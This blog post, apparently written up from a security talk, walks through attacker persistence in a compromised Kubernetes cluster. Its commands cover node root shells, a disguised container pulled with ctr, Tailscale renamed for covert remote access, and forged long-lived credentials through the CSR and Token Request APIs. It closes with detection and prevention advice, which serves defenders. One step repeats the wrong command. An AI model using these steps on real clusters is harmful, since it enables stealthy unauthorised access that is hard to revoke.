---
layout: post
title: "Beyond the surface - Exploring attacker persistence strategies in Kubernetes"
date: 2025-09-12 10:00:00 +0100
comments: false
categories: Kubernetes
---

I've been doing a talk on Kubernetes post-exploitation for a while now and one of requests has been for a blog post to refer back to, which I'm finally getting around to doing now!

The goal of this talk is to lay out one attack path that attackers might use to retain and expand their access after an initial compromise of a Kubernetes cluster by getting access to an admin's credentials. It doesn't cover all the ways that attackers could do this, but provides one path and also hopefully illuminates some of the inner workings and default settings that attackers might exploit as part of their exploits.

There's a recording of the talk [here](https://www.youtube.com/watch?v=GtrkIuq5T3M&t=11s) if you prefer videos, the flow is similar but I have simplified a bit for the latest iteration, thanks to [debug profiles](https://raesene.github.io/blog/2025/05/30/kubernetes-debug-profiles/)! The general story the talk tells is one where attackers have temporary access to a cluster admin's laptop where the admin has stepped away to take a call and not locked it, and they have to see how to get and keep access to the cluster before the admin comes back.

### Initial access

One of the first things an attacker might want to do with credentials is get a root shell on a Kubernetes cluster node as a good spot to look for credentials or plant binaries. With Kubernetes that's very simple to do as there is functionality built in to the cluster to allow for users with the right levels of access to do that quickly via `kubectl debug`

A typical command might look like this (just replace the node name with one from your cluster)

```
kubectl debug node/gke-demo-cluster-default-pool-04a13cdb-5p8d -it --profile=sysadmin --image=busybox
```

An important point from this command is the `--profile` switch as it dictates how much access you'll have to the node. The `sysadmin` profile provides the highest level of access, so is the most useful for attackers.

### Executing Binaries

Once the attacker has shell access to a node, their next instinct is likely to download tools to run. This might not be as simple as it could be as many Kubernetes distributions lock down the Node OS, setting filesystems as read-only or `noexec`. However, all cluster nodes can do one thing... run containers. So if the attacker can download and run a container on the node, they're likely to be able to run any programs they like!

Doing this we can take a look at some lesser known features of Kubernetes clusters. In a cluster, all containers are run by a container runtime, typically [containerd](https://containerd.io/) or [CRI-O](https://cri-o.io/), and it's possible to talk directly to those programs if you're on the node, bypassing the Kubernetes APIs altogether.

In the talk I start by creating a new containerd namespace using the `ctr` tool. Ctr is very useful as it's always installed (IME) alongside containerd, so you don't need to get an external client program. We're creating a containerd namespace to make it a bit harder for someone looking at the host to spot our container. Importantly containerd namespaces have nothing to do with Kubernetes namespaces, or Linux namespaces.

```
ctr namespace create sys_net_mon
```

We create a namespace called `sys_net_mon` just to make it a bit less obvious than "attackers were here"!. With the namespace created, the next step is to pull down a container image. The one I'm using is `docker.io/sysnetmon/systemd_net_mon:latest` . Importantly the contents of this container image have nothing to do with systemd or network monitoring! From a security standpoint it's an important thing to remember that outside of the official or verified images, Docker Hub does no curation of image contents, so anyone can call their images anything!

```
ctr -n sys_net_mon images pull docker.io/sysnetmon/systemd_net_mon:latest
```

With the image pulled we can use `ctr` to start a container

```
ctr -n sys_net_mon run --net-host -d --mount type=bind,src=/,dst=/host,options=rbind:ro docker.io/sysnetmon/systemd_net_mon:latest sys_net_mon
```

This container provides us with full access to the hosts filesystem and also the host's network interfaces which is pretty useful for post-exploitation activity. After that it's just a question of getting a shell in the container.

```
ctr -n sys_net_mon run --net-host -d --mount type=bind,src=/,dst=/host,options=rbind:ro docker.io/sysnetmon/systemd_net_mon:latest sys_net_mon
```

### Static Manifests

Another approach which the attackers could use to run a container on the node is static manifests. Most Kubelets will define a directory on the host which it will load static manifests from. These manifests run a pod without any API server necessary. A handy trick for our attackers is to give their static pod an invalid namespace name, as this prevents it being registered with the API server, so it won't show up in `kubectl get pods -A` or similar. There's more details on static pods and some of their security oddness on [Iain Smart's blog](https://blog.iainsmart.co.uk/posts/2024-10-13-mirror-mirror/)

### Remote Access

The next problem our attackers have to tackle is retaining remote access to the environment after the admin returns to their laptop. Whilst there are a number of remote access programs available, a lot of the security/hacker related ones will be spotted by EDR/XDR style agents, so an alternative can be using something like [Tailscale](https://tailscale.com/)!

Tailscale has a number of features which are very useful for attackers (in addition to their normal usefulness!). First one is that it can be run with two statically compiled golang binaries that can be renamed. This means that you pick what will show up in the process list of the node. Following the theme of the container image, we use binaries `systemd_net_mon_server` and `systemd_net_mon_client`

The first command starts the server

```
systemd_net_mon_server --tun=userspace-networking --socks5-server=localhost:1055 &
```
and then we start the client

```
systemd_net_mon_client up --ssh --hostname cafebot --auth-key=tskey-auth-XXXXX
```

In terms of network access this will run on only 443/TCP outbound if it uses Tailscale's DERP network, so that access will probably be allowed in most environments. Also we can use Tailscale's ACL feature so that our compromised container can't communicate with any other machines on our Tailnet.

![Tailscale ACLs]({{site.url }}/assets/media/Tailscale-bot-access-control.png)

With those services running it should be possible to come back into the container over SSH. Tailscale bundles an SSH server with the program, no SSHD will show as running :)

```
tailscale ssh root@cafebot
```

### Credentials - Kubelet API

With remote access achieved, our attackers still need long lasting credentials and also it would be nice if they could probe the cluster without touching the Kubernetes API server, as that might show up in audit logs. So to do this they need access to credentials for a user who can talk to the Kubelet API directly. This runs on every node on 10250/TCP and has no auditing option available.

In the talk to do this I use [teisteanas](https://github.com/raesene/teisteanas/) which creates Kubeconfig based credentials for users using the Certificiate Signing Request (CSR) API. We can create a set of credentials for any user using this approach. For stealth an attacker would likely choose a user which already has rights assigned to it in RBAC, so they don't have to create any new cluster roles or cluster role bindings. The exact user to use will vary, but in the demos from the talk I use `kube-apiserver` which is a user that exists in GKE clusters.

```
teisteanas -username kube-apiserver -output-file kubelet-user.config
```

With that Kubeconfig file in hand and access to the Kubelet port on a host, it's possible to take actions like listing pods on a node or executing commands in those pods. The easiest way to do this is to use [kubeletctl](https://github.com/cyberark/kubeletctl). So from our container which is running on the node, using the node's network namespace, we can run something like this

```
kubeletctl -s 127.0.0.1 -k kubelet-user.config pods
```

### CSR API

It's also important to understand a bit about the CSR API as, for attackers, it's a useful thing to take advantage of. This API exists in pretty much every Kubernetes distribution and can be used to create credentials that authenticate to the cluster, apart from when using EKS as it does not allow that function. Very importantly credentials created via the CSR API can be abused by anyone who has access to the API server. Most managed Kubernetes distributions have chosen to have the Kubernetes API server exposed to the Internet by default, so an attacker who is able to get credentials for a cluster will be able to use them from anywhere in the world!

The CSR API is also attractive to attackers for a number of reasons :-

- Unless audit logging is enabled and correctly configured there is no record of the API having been used and the credentials having been created.
- Credentials created by this API cannot be revoked without rotating the certificate authority for the whole cluster, which is a disruptive operation. The [GitHub issue related to certificate revocation](https://github.com/kubernetes/kubernetes/issues/18982) has been open since 2015, so it's likely this will not change now...
- It's possible to create credentials for generic system accounts, so even if the cluster operator has audit logging enabled, it could be difficult to identify malicious activity.
- The credentials tend to be long lived. Whilst this is distribution dependent, generally this is 1-5 years.

In the demos for the talk we're running against a GKE cluster, so used the CSR API to generate credentials for the `system:gke-common-webhooks` user which has quite wide ranging privileges.

```
teisteanas -username system:gke-common-webhooks -output-file webhook.config
```

### Token Request API

Even if the CSR API isn't available there's another option built into Kubernetes that can create new credentials, which is the Token Request API. This is used by Kubernetes clusters to create service account tokens, but there's nothing to stop an administrator who has the correct rights from using it. Similarly to the CSR API there's no persistent record (apart from audit logs) that new credentials have been created, and they can be hard to revoke if a system level service account has been used, as the only way to revoke the credential is to delete it's associated service account.

The expiry may be less of a problem, depending on the Kubernetes distribution in use, it can vary from 24 hours maximum  to one year, from the managed distributions I've looked at.

In the talk I use [tocan](https://github.com/raesene/tocan/) to simplify the process of creating a Kubeconfig file from a service account token.

```
tocan -namespace kube-system -service-account clusterrole-aggregation-controller
```

The service account we clone is an interesting one as it has the "escalate" right, which means it can always become Cluster-admin even if it doesn't have those rights to begin with. (I've written about [escalate](https://raesene.github.io/blog/2020/12/12/Escalating_Away/) before)

### Detecting these attacks

The talk closes by discussing how to detect and prevent these kind of attacks. For detection there's a couple of key things to look at

- **Kubernetes audit logs** - This one is very important. You need to have audit logging enabled with centralized logs and good retention, to spot some of the techniques used here, especially abuse of the CSR and Token Request APIs
- **Node Agents** - Having security agents running on cluster nodes could allow for detection of things like the Tailscale traffic, depending on their configuration
- **Node Logs** - Generally ensuring that logs on nodes are properly centralized and stored is going to be important, as attackers can leave traces there.
- **Know what good looks like** - This one sounds simple but possibly isn't. If you know what processes should be running on your cluster nodes, you can spot things like "systemd_net_mon" when they show up. What's tricky here is that every distribution has a different set of management services run by the cloud provider, so it's not a one off effort knowing what should be there.

### Preventing these attacks

There are a couple of key ways cluster admins can reduce the risk of this scenario happening to them,

- **Take your clusters off the Internet!!** - Exposing the API server this way means you are one set of lost credentials away from a very bad day. Generally managed Kubernetes distributions will allow you to restrict access, but it's not the default.
- **Least Privilege** - In this scenario, the compromised laptop had cluster-admin level privileges, enabling the attackers to move through the cluster easily. If the admin had been using an account with fewer privileges, the attacks might well not have succeeded. Whilst some of the rights used, like node debugging, are probably quite commonly used, others like the CSR API and Token Request API probably shouldn't be needed in day-to-day administration, so could be restricted.

To quote [Ian Coldwater](https://bsky.app/profile/lookitup.baby)

![Made of stars]({{site.url }}/assets/media/made-of-stars.png)

### Conclusion

This talk just looks at one path that attackers could take to retain and expand their access to a cluster which they get access to. There are obviously other possibilities, but this can shed some light on some of the ways that Kubernetes works and how to improve your cluster security!